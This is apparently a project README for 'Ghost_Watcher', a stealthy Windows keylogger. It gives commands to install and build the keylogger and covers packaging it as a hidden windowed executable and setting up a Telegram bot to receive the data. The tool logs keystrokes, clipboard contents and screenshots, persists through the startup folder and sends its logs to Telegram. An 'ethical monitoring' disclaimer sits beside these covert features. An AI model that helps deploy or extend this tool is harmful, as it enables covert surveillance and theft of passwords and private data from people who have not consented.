# Ghost_Watcher
A stealthy keylogger that logs keystrokes, captures clipboard data, and sends encrypted logs and decrypted logs to Telegram. Runs invisibly and only supports Windows. Ideal for ethical monitoring with proper consent. Use responsibly.

# Keylogger with Enhanced Features

This Python script is a keylogger with additional features such as screenshot capture, system information collection, log file encryption, and persistence. It sends captured data to a Telegram bot at regular intervals.

**Disclaimer:** This script is for educational purposes only. You can use it responsibly and only on systems you own or have explicit permission to monitor. The unauthorized use of keyloggers is illegal and unethical.

---

## Features

- **Keystroke Logging**: Captures and logs keystrokes.
- **Screenshot Capture**: Takes periodic screenshots.
- **System Information Collection**: Gathers system details (OS, processor, username, etc.).
- **Log File Encryption**: Encrypts log files using Fernet encryption.
- **Persistence**: Adds the script to startup on Windows.
- **Telegram Integration**: Sends logs and screenshots to a Telegram bot.

---

## Prerequisites

Before running the script, ensure you have the following:

1. **Python 3.6+**: Install Python from [python.org](https://www.python.org/).
2. **Required Libraries**: Install the necessary Python libraries using `pip. '
3. **Telegram Bot**: Create a Telegram bot and obtain the API token and chat ID.

---

## Installation

### 1. Clone the Repository

Clone this repository to your local machine:

```bash
git clone https://github.com/MintViper03/Ghost_Watcher.git
cd Ghost_Watcher
```

### 2. Install Dependencies

Install the required Python libraries:

```bash
pip install pynput pyperclip requests pyautogui cryptography pywin32
```
### Or

You can merge all the files into one apk. That apk checks if python is installed in that system. If not, it can automatically install Python and its libraries and then run the script.

```bash
cd Ghost_Watcher
pyinstaller --onefile --windowed ghost_watcher.py
```

## Configuration

### 1. Setup Telegram Bot
1. Open Telegram and search for the BotFather.
2. Create a new bot using the /newbot command.
3. Save the API token provided by BotFather.
4. Start a chat with your bot and send a message.
5. Use the following URL to get your chat ID (replace YOUR_TOKEN with your bot's token):
   `https://api.telegram.org/botYOUR_TOKEN/getUpdates`
6. Look for the chat.id field in the JSON response.

### 2. Update Script Configuration
Open the script (`ghost_watcher.py`) and update the following variables:

```Python
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot's token
CHAT_ID = "YOUR_CHAT_ID"           # Replace with your chat ID
```

## Usage

### 1. Run the Script or Apk File

Execute the script:

```bash
python3 ghost_watcher.py
```
The script will:
- Start capturing keystrokes.
- Take screenshots at regular intervals.
- Collect system information.
- Encrypt and send logs to your Telegram bot.

### 2. Persistence (Optional)
The script automatically adds itself to the Windows startup folder. If you want to disable this feature, comment out the following line in the script:
```Python
add_to_startup()
```

### 3. Stopping the Script
To stop the script, press `Ctrl + C` in the terminal where it is running.
### Or
If you run APK, then remove it from the task manager running processes and startup folder.


